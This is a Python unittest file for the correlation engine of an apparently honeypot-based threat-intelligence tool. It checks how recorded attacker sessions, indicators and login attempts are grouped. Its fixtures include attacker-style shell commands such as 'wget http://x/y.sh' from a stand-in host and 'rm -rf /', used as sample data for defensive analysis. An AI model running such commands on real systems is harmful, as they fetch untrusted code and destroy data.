"""
tests/test_correlation.py — the Correlation layer's contract.

Run:  python3 -m unittest discover -s tests -v     (from the repo root)

Correlation is the layer everything downstream consumes, so these pin the
promises its docstring makes rather than whatever the shipped ruleset happens
to say today:

  * PURE — no database, no re-derivation. Callers hand in records.
  * THE STREAMS ARE NEVER JOINED — the auth table carries no session_id, so a
    session<->login link would be an invented guess.
  * NO INTERPRETATION — the only wording emitted is the strategy's `statement`,
    verbatim from YAML. No severity, no score, no ranking by danger.
  * A key held by ONE member is not a relationship; it is just a value.
  * Evidence is attached per STRATEGY, never blanket — one member's commands
    would be a lie about a src_ip group.

Strategies are fed from temporary YAML so these test the ENGINE, not the
policy. stdlib unittest, matching tests/test_detection.py: the repo has no
pytest and a test layer should not also be a new dependency.
"""
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from threat_intel import correlation as C  # noqa: E402


def session(sid, cmds=(), src="10.0.0.1", inst="sensor-a",
            first="2026-01-01 00:00:00", last="2026-01-01 00:05:00"):
    return {"session_id": sid, "src_ip": src, "instance": inst,
            "commands_ordered": list(cmds), "first_seen": first, "last_seen": last}


SEQ_ONLY = """
strategies:
  - id: same_sequence
    stream: sessions
    key: command_sequence
    match: exact
    enabled: true
    statement: these sessions share an identical observed command sequence
"""

SRC_ONLY = """
strategies:
  - id: same_source_address
    stream: sessions
    key: src_ip
    match: exact
    enabled: true
    statement: these sessions originate from the same recorded source address
"""

IND_ONLY = """
strategies:
  - id: shared_indicator
    stream: indicators
    key: indicator_value
    match: exact
    enabled: true
    statement: these sessions reference the same observed indicator value
"""

AUTH_ONLY = """
strategies:
  - id: shared_credential
    stream: auth
    key: credential_pair
    match: exact
    enabled: true
    statement: these login attempts submitted the same credential pair
"""


class StrategyFileMixin:
    """Writes a throwaway ruleset and points correlate() at it."""

    def strategies(self, body: str) -> str:
        fh = tempfile.NamedTemporaryFile("w", suffix=".yml", delete=False,
                                         encoding="utf-8")
        fh.write(body)
        fh.close()
        self.addCleanup(os.unlink, fh.name)
        C.load_strategies(fh.name, force=True)
        return fh.name


# ── purity ──────────────────────────────────────────────────────────────────

class TestPurity(unittest.TestCase):
    """The engine must not reach for data of its own — that is what keeps it
    cheap, testable, and unable to disagree with the window its caller used."""

    def test_module_does_not_import_storage_or_a_database(self):
        src = open(C.__file__, encoding="utf-8").read()
        for banned in ("import storage", "import sqlite3", "query_range",
                       "query_session", "query_all"):
            self.assertNotIn(banned, src,
                             f"correlation.py reaches for data: {banned}")

    def test_no_input_means_no_relationships_not_an_error(self):
        self.assertEqual(C.correlate(), [])
        self.assertEqual(C.correlate(sessions=[], indicators=[], auth_rows=[]), [])

    def test_caller_records_are_not_mutated(self):
        sessions = [session("a", ["ls"]), session("b", ["ls"])]
        snapshot = [dict(s, commands_ordered=list(s["commands_ordered"]))
                    for s in sessions]
        C.correlate(sessions=sessions)
        self.assertEqual(sessions, snapshot)


# ── strategy loading ────────────────────────────────────────────────────────

class TestStrategyLoading(StrategyFileMixin, unittest.TestCase):

    def tearDown(self):
        C.load_strategies(C.STRATEGIES_PATH, force=True)

    def test_disabled_strategies_are_not_loaded(self):
        path = self.strategies(SEQ_ONLY + """
  - id: off
    stream: sessions
    key: src_ip
    match: exact
    enabled: false
    statement: disabled
""")
        self.assertEqual([s["id"] for s in C.load_strategies(path, force=True)],
                         ["same_sequence"])

    def test_unknown_key_is_skipped_and_recorded(self):
        """A strategy naming a key the engine cannot extract must fail LOUDLY:
        silently producing nothing is indistinguishable from 'nothing
        correlated'."""
        path = self.strategies("""
strategies:
  - id: bogus
    stream: sessions
    key: command_seqence
    match: exact
    enabled: true
    statement: typo in key
""")
        self.assertEqual(C.load_strategies(path, force=True), [])
        self.assertIn("bogus", dict(C.load_errors(path)))

    def test_unsupported_match_mode_is_rejected(self):
        path = self.strategies("""
strategies:
  - id: fuzzy
    stream: sessions
    key: command_sequence
    match: normalised
    enabled: true
    statement: not implemented
""")
        self.assertEqual(C.load_strategies(path, force=True), [])
        self.assertIn("fuzzy", dict(C.load_errors(path)))

    def test_strategy_without_a_statement_is_rejected(self):
        """`statement` is the only wording a UI may render, so a strategy that
        has none could only be displayed by inventing text for it."""
        path = self.strategies("""
strategies:
  - id: mute
    stream: sessions
    key: src_ip
    match: exact
    enabled: true
""")
        self.assertEqual(C.load_strategies(path, force=True), [])

    def test_strategy_without_a_stream_is_rejected(self):
        path = self.strategies("""
strategies:
  - id: nowhere
    key: src_ip
    match: exact
    enabled: true
    statement: no stream
""")
        self.assertEqual(C.load_strategies(path, force=True), [])

    def test_unreadable_file_yields_no_strategies_and_an_error(self):
        missing = os.path.join(tempfile.gettempdir(), "no_such_strategies.yml")
        self.assertEqual(C.load_strategies(missing, force=True), [])
        self.assertTrue(C.load_errors(missing))

    def test_cache_is_keyed_by_path(self):
        """Regression: a single global slot made the `path` argument silently
        ignored once any ruleset had loaded — so a caller asking for a
        different file got the first one back, with no error."""
        a = self.strategies(SEQ_ONLY)
        b = self.strategies(SRC_ONLY)
        self.assertEqual([s["id"] for s in C.load_strategies(a)], ["same_sequence"])
        self.assertEqual([s["id"] for s in C.load_strategies(b)],
                         ["same_source_address"])
        self.assertEqual([s["id"] for s in C.load_strategies(a)], ["same_sequence"])

    def test_shipped_ruleset_loads_cleanly(self):
        C.load_strategies(C.STRATEGIES_PATH, force=True)
        self.assertEqual(C.load_errors(C.STRATEGIES_PATH), [])
        self.assertTrue(C.load_strategies(C.STRATEGIES_PATH))


# ── grouping ────────────────────────────────────────────────────────────────

class TestSequenceGrouping(StrategyFileMixin, unittest.TestCase):

    def tearDown(self):
        C.load_strategies(C.STRATEGIES_PATH, force=True)

    def test_identical_sequences_group(self):
        path = self.strategies(SEQ_ONLY)
        rels = C.correlate(sessions=[session("a", ["ls", "id"]),
                                     session("b", ["ls", "id"])], path=path)
        self.assertEqual(len(rels), 1)
        self.assertEqual(rels[0]["members"], ["a", "b"])

    def test_different_sequences_do_not_group(self):
        path = self.strategies(SEQ_ONLY)
        rels = C.correlate(sessions=[session("a", ["ls"]), session("b", ["id"])],
                           path=path)
        self.assertEqual(rels, [])

    def test_a_key_held_by_one_member_is_not_a_relationship(self):
        path = self.strategies(SEQ_ONLY)
        self.assertEqual(C.correlate(sessions=[session("a", ["ls"])], path=path), [])

    def test_order_is_part_of_the_key(self):
        """`command_sequence` is an ORDERED key — same commands in a different
        order is different behaviour, not the same script."""
        path = self.strategies(SEQ_ONLY)
        rels = C.correlate(sessions=[session("a", ["ls", "id"]),
                                     session("b", ["id", "ls"])], path=path)
        self.assertEqual(rels, [])

    def test_sessions_with_no_commands_are_excluded(self):
        path = self.strategies(SEQ_ONLY)
        rels = C.correlate(sessions=[session("a", []), session("b", [])], path=path)
        self.assertEqual(rels, [])

    def test_matching_is_exact_not_whitespace_folded(self):
        path = self.strategies(SEQ_ONLY)
        rels = C.correlate(sessions=[session("a", ["ls  -la"]),
                                     session("b", ["ls -la"])], path=path)
        self.assertEqual(rels, [])


class TestSourceGrouping(StrategyFileMixin, unittest.TestCase):

    def tearDown(self):
        C.load_strategies(C.STRATEGIES_PATH, force=True)

    def test_groups_by_source_address(self):
        path = self.strategies(SRC_ONLY)
        rels = C.correlate(sessions=[session("a", ["ls"], src="1.1.1.1"),
                                     session("b", ["id"], src="1.1.1.1"),
                                     session("c", ["w"], src="2.2.2.2")], path=path)
        self.assertEqual(len(rels), 1)
        self.assertEqual(rels[0]["members"], ["a", "b"])
        self.assertEqual(rels[0]["distinct_sources"], 1)

    def test_sessions_without_a_source_are_excluded(self):
        path = self.strategies(SRC_ONLY)
        rels = C.correlate(sessions=[session("a", ["ls"], src=""),
                                     session("b", ["id"], src=None)], path=path)
        self.assertEqual(rels, [])


class TestIndicatorGrouping(StrategyFileMixin, unittest.TestCase):

    def tearDown(self):
        C.load_strategies(C.STRATEGIES_PATH, force=True)

    def test_members_come_from_the_indicator_record(self):
        path = self.strategies(IND_ONLY)
        iocs = [{"type": "url", "value": "http://x/y.sh", "sessions": ["a", "b"]}]
        rels = C.correlate(sessions=[session("a"), session("b")],
                           indicators=iocs, path=path)
        self.assertEqual(len(rels), 1)
        self.assertEqual(rels[0]["members"], ["a", "b"])
        self.assertEqual(rels[0]["link_value"], "url:http://x/y.sh")

    def test_type_and_value_together_form_the_key(self):
        """Same string as a domain and as a hash is not the same indicator."""
        path = self.strategies(IND_ONLY)
        iocs = [{"type": "domain", "value": "evil", "sessions": ["a", "b"]},
                {"type": "hash", "value": "evil", "sessions": ["c", "d"]}]
        rels = C.correlate(indicators=iocs, path=path)
        self.assertEqual(len(rels), 2)
        self.assertEqual({r["link_value"] for r in rels},
                         {"domain:evil", "hash:evil"})

    def test_indicator_in_one_session_is_not_a_relationship(self):
        path = self.strategies(IND_ONLY)
        rels = C.correlate(indicators=[{"type": "url", "value": "u",
                                        "sessions": ["a"]}], path=path)
        self.assertEqual(rels, [])

    def test_sessions_field_may_be_a_set_or_a_list(self):
        """IOCStore.records() returns a sorted list; the store itself holds a
        set. Both must work rather than the engine assuming one."""
        path = self.strategies(IND_ONLY)
        for form in (["a", "b"], {"a", "b"}):
            rels = C.correlate(indicators=[{"type": "ip", "value": "9.9.9.9",
                                            "sessions": form}], path=path)
            self.assertEqual(len(rels), 1, f"failed for {type(form).__name__}")


class TestStreamsAreNeverJoined(StrategyFileMixin, unittest.TestCase):
    """storage.py's auth table carries no session_id, so any session<->login
    link would be an invented (src_ip, time) guess."""

    def tearDown(self):
        C.load_strategies(C.STRATEGIES_PATH, force=True)

    def test_auth_members_are_auth_row_ids_not_session_ids(self):
        path = self.strategies(AUTH_ONLY)
        auth = [{"id": 1, "username": "root", "password": "x", "src_ip": "1.1.1.1"},
                {"id": 2, "username": "root", "password": "x", "src_ip": "2.2.2.2"}]
        rels = C.correlate(sessions=[session("a"), session("b")],
                           auth_rows=auth, path=path)
        self.assertEqual(len(rels), 1)
        self.assertEqual(rels[0]["members"], [1, 2])
        # Auth rows are not sessions, so no session facts are attributed.
        self.assertEqual(rels[0]["distinct_sources"], 0)
        self.assertEqual(rels[0]["src_ips"], [])

    def test_session_strategies_ignore_auth_rows_entirely(self):
        path = self.strategies(SEQ_ONLY)
        auth = [{"id": 1, "username": "root", "password": "x"},
                {"id": 2, "username": "root", "password": "x"}]
        self.assertEqual(C.correlate(auth_rows=auth, path=path), [])

    def test_auth_rows_without_an_id_are_skipped(self):
        path = self.strategies(AUTH_ONLY)
        auth = [{"username": "root", "password": "x"},
                {"username": "root", "password": "x"}]
        self.assertEqual(C.correlate(auth_rows=auth, path=path), [])


# ── relationship shape ──────────────────────────────────────────────────────

class TestRelationshipShape(StrategyFileMixin, unittest.TestCase):

    def tearDown(self):
        C.load_strategies(C.STRATEGIES_PATH, force=True)

    def test_reports_facts_about_the_group(self):
        path = self.strategies(SEQ_ONLY)
        rels = C.correlate(sessions=[
            session("a", ["ls"], src="1.1.1.1", inst="s1",
                    first="2026-01-01 00:00:00", last="2026-01-01 00:01:00"),
            session("b", ["ls"], src="2.2.2.2", inst="s2",
                    first="2026-01-02 00:00:00", last="2026-01-02 00:01:00"),
        ], path=path)
        r = rels[0]
        self.assertEqual(r["member_count"], 2)
        self.assertEqual(r["distinct_sources"], 2)
        self.assertEqual(r["src_ips"], ["1.1.1.1", "2.2.2.2"])
        self.assertEqual(r["scope"], ["s1", "s2"])
        self.assertEqual(r["first_seen"], "2026-01-01 00:00:00")   # earliest
        self.assertEqual(r["last_seen"], "2026-01-02 00:01:00")    # latest

    def test_statement_is_the_yaml_text_verbatim(self):
        """The engine reports evidence, never conclusions — so it must never
        compose wording of its own."""
        path = self.strategies("""
strategies:
  - id: same_sequence
    stream: sessions
    key: command_sequence
    match: exact
    enabled: true
    statement: EXACT WORDING FROM THE RULESET
""")
        rels = C.correlate(sessions=[session("a", ["ls"]), session("b", ["ls"])],
                           path=path)
        self.assertEqual(rels[0]["statement"], "EXACT WORDING FROM THE RULESET")

    def test_emits_no_severity_score_or_ranking(self):
        path = self.strategies(SEQ_ONLY)
        rels = C.correlate(sessions=[session("a", ["ls"]), session("b", ["ls"])],
                           path=path)
        banned = {"severity", "score", "risk", "risk_score", "weight",
                  "priority", "confidence", "rank", "fi", "fi_score", "malicious"}
        self.assertEqual(set(rels[0]) & banned, set())

    def test_ordering_is_by_size_then_stable(self):
        """Most members first so output is explainable — NOT a ranking of
        importance, and stable so two runs agree."""
        path = self.strategies(SEQ_ONLY)
        sessions = ([session(f"a{i}", ["one"]) for i in range(4)] +
                    [session(f"b{i}", ["two"]) for i in range(2)])
        rels = C.correlate(sessions=sessions, path=path)
        self.assertEqual([r["member_count"] for r in rels], [4, 2])
        self.assertEqual(rels, C.correlate(sessions=sessions, path=path))


# ── evidence ────────────────────────────────────────────────────────────────

class TestEvidence(StrategyFileMixin, unittest.TestCase):

    def tearDown(self):
        C.load_strategies(C.STRATEGIES_PATH, force=True)

    def test_sequence_links_describe_what_is_shared(self):
        path = self.strategies(SEQ_ONLY)
        cmds = ["cd /tmp", "wget http://x/y.sh", "cd /tmp"]
        rels = C.correlate(sessions=[session("a", cmds), session("b", cmds)],
                           path=path)
        ev = rels[0]["evidence"]
        self.assertEqual(ev["sequence_length"], 3)
        self.assertEqual(ev["distinct_commands"], 2)
        self.assertEqual(ev["sample"][:2], cmds[:2])

    def test_source_links_carry_no_evidence(self):
        """Members of a src_ip group ran DIFFERENT sequences, so publishing one
        member's commands as the group's evidence would be false."""
        path = self.strategies(SRC_ONLY)
        rels = C.correlate(sessions=[session("a", ["ls"], src="1.1.1.1"),
                                     session("b", ["rm -rf /"], src="1.1.1.1")],
                           path=path)
        self.assertIsNone(rels[0]["evidence"])

    def test_indicator_links_carry_no_evidence(self):
        path = self.strategies(IND_ONLY)
        rels = C.correlate(sessions=[session("a", ["ls"]), session("b", ["id"])],
                           indicators=[{"type": "url", "value": "u",
                                        "sessions": ["a", "b"]}], path=path)
        self.assertIsNone(rels[0]["evidence"])

    def test_sample_is_capped_and_never_claims_to_be_the_transcript(self):
        path = self.strategies(SEQ_ONLY)
        cmds = [f"cmd{i}" for i in range(40)]
        rels = C.correlate(sessions=[session("a", cmds), session("b", cmds)],
                           path=path)
        ev = rels[0]["evidence"]
        self.assertEqual(len(ev["sample"]), 12)
        self.assertEqual(ev["sequence_length"], 40)   # the true length is kept


# ── the rows -> sessions adapter ────────────────────────────────────────────

class TestSessionsFromRows(unittest.TestCase):

    def test_preserves_execution_order(self):
        rows = [{"session_id": "a", "cmd": "first", "timestamp": "t2"},
                {"session_id": "a", "cmd": "second", "timestamp": "t1"}]
        out = C.sessions_from_rows(rows)
        # Row order is execution order; sorting by timestamp would silently
        # reorder a sequence whose key depends on that order.
        self.assertEqual(out[0]["commands_ordered"], ["first", "second"])

    def test_tracks_first_and_last_seen(self):
        rows = [{"session_id": "a", "cmd": "x", "timestamp": "2026-01-02"},
                {"session_id": "a", "cmd": "y", "timestamp": "2026-01-01"},
                {"session_id": "a", "cmd": "z", "timestamp": "2026-01-03"}]
        s = C.sessions_from_rows(rows)[0]
        self.assertEqual(s["first_seen"], "2026-01-01")
        self.assertEqual(s["last_seen"], "2026-01-03")

    def test_rows_without_a_session_id_are_skipped(self):
        rows = [{"session_id": None, "cmd": "x"}, {"cmd": "y"},
                {"session_id": "a", "cmd": "z"}]
        self.assertEqual([s["session_id"] for s in C.sessions_from_rows(rows)], ["a"])

    def test_a_session_with_no_commands_still_exists(self):
        """It has no sequence to correlate on, but it is a real session and a
        src_ip strategy can still group it."""
        rows = [{"session_id": "a", "cmd": "", "src_ip": "1.1.1.1"}]
        out = C.sessions_from_rows(rows)
        self.assertEqual(len(out), 1)
        self.assertEqual(out[0]["commands_ordered"], [])

    def test_carries_source_and_instance(self):
        rows = [{"session_id": "a", "cmd": "x", "src_ip": "1.1.1.1",
                 "instance": "sensor-b"}]
        s = C.sessions_from_rows(rows)[0]
        self.assertEqual(s["src_ip"], "1.1.1.1")
        self.assertEqual(s["instance"], "sensor-b")

    def test_empty_input(self):
        self.assertEqual(C.sessions_from_rows([]), [])


if __name__ == "__main__":
    unittest.main(verbosity=2)
